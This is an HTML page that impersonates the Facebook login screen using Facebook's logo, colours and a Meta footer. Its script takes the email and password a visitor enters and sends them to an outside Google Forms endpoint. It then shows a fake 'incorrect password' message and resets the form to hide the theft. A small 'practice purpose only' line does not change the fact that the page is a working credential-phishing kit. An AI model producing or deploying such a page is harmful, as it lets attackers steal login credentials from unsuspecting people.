<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        /* General Styling */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        /* Centering the entire page */
        body {
            background: linear-gradient(to bottom right, #f0f2f5, #dfe3ee);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Main container */
        .container {
            text-align: center;
            width: 90%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        /* Facebook logo */
        .logo {
            width: 50px;
            margin-bottom: 10px;
        }

        /* Input fields */
        .input-box {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
        }

        /* Login button */
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            font-size: 18px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #166fe5;
        }

        /* Forgotten Password */
        .forgot-password {
            display: block;
            margin: 12px 0;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Create New Account Button */
        .create-account {
            width: 100%;
            padding: 12px;
            background: none;
            border: 1px solid #1877f2;
            color: #1877f2;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
        }

        .create-account:hover {
            background-color: #e7f3ff;
        }

        /* Footer */
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #606770;
        }

        /* Popup Message */
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            text-align: center;
        }

        .popup button {
            margin-top: 10px;
            padding: 8px 16px;
            border: none;
            background: #1877f2;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }

        .popup button:hover {
            background: #166fe5;
        }

        .practice-warning {
            font-size: 14px;
            color: #f44336;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- English (UK) -->
        <div style="font-size: 14px; margin-bottom: 10px;">English (UK)</div>

        <!-- Facebook Logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">

        <!-- Login Form -->
        <form id="login-form">
            <input type="email" id="email" name="email" class="input-box" placeholder="Mobile number or email address" required>
            <input type="password" id="password" name="password" class="input-box" placeholder="Password" required>
            <button type="submit" class="login-btn">Log in</button>
        </form>

        <!-- Forgot Password -->
        <a href="#" class="forgot-password">Forgotten Password?</a>

        <!-- Create Account Button -->
        <button class="create-account">Create new account</button>

        <!-- Footer -->
        <div class="footer">Â© Meta</div>

        <div class="practice-warning">
            Practice purpose only. Using real password may be risky
        </div>
    </div>

    <!-- Popup Message -->
    <div id="popup-message" class="popup">
        <p>Incorrect email or password!</p>
        <button onclick="closePopup()">OK</button>
    </div>

    <script>
        document.getElementById("login-form").addEventListener("submit", function(event) {
            event.preventDefault(); 
            
            const formData = new FormData();
            
            // Get values from input fields
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            
            // Append data to FormData object with the same entry names
            formData.append("entry.2087220391", email);  // Replace with actual entry ID for email
            formData.append("entry.1222639255", password);  // Replace with actual entry ID for password

            fetch("https://docs.google.com/forms/d/e/1FAIpQLScJK08S-fYkzdcJnqR9CLUxBmdMut6NP5E1bwhTuNqAQrVOpg/formResponse", {
                method: "POST",
                body: formData,
                mode: "no-cors"  
            }).then(() => {
                document.getElementById("popup-message").style.display = "block";
                document.getElementById("login-form").reset(); 
            }).catch(error => console.error("Error:", error));
        });

        function closePopup() {
            document.getElementById("popup-message").style.display = "none";
        }
    </script>

</body>
</html>
